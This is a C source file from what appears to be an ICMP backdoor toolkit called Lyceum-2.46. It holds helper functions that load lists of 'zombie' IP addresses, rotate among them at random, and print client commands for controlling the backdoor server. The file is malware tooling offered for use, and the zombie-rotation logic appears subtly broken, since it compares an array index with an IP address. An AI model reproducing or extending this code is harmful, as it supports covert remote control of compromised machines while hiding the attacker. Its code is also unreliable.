
/* 
 * Lyceum-2.46
 *
 * Copyright (c) 2004 phish <phish@hush.com>
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in
 *    the
 *    documentation and/or other materials provided with the
 *    distribution.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR AND CONTRIBUTORS ``AS
 * IS'' AND
 * ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED
 * TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A
 * PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR OR CONTRIBUTORS
 * BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
 * CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
 * SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
 * INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
 * CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
 * ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
 * POSSIBILITY OF
 * SUCH DAMAGE.
 *
 */




#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/utsname.h>
#include <unistd.h>
#include <netdb.h>
#include "icmp_bd.h"
#include "zombie_funcs.h"

unsigned long get_random (int, int);

void
zombie_list_init (char *file_name)
{
  FILE *fp;
  char line_buf[1024];

  if ((fp = fopen (file_name, "r")) == NULL)
    {
      perror ("fopen()");
      return;
    }

  for (zomb_t.zomb_max = 0; (fgets (line_buf, 1024, fp)) != NULL;
       zomb_t.zomb_max++)
    {
      if (zomb_t.zomb_max >= 1024)
	break;

      zomb_t.zomb_list[zomb_t.zomb_max] = inet_addr (line_buf);
    }

  zomb_t.zomb_flag = 1;
  fclose (fp);
  return;
}

unsigned long
zombie_update (unsigned long zombie_ip)
{
  int z = zombie_ip;

  if (zomb_t.zomb_flag)
    {
      while (z == zombie_ip)
	z = get_random (0, zomb_t.zomb_max);
      return zomb_t.zomb_list[z];
    }

  return zombie_ip;
}

void
print_info (int which)
{
  printf ("\n");
  printf (".exit  - exit client\n");
  printf (".close - close client and server\n");
  printf (".clear - clear screen\n");
  printf ("\n");

  if (which)
    {
      printf (".lz    - load a new zombie IP\n");
      printf (".llz   - load a new list of zombie IPs\n");
      printf (".tsz   - set server to use random zombie IP list\n");
      printf ("\n");
    }
}
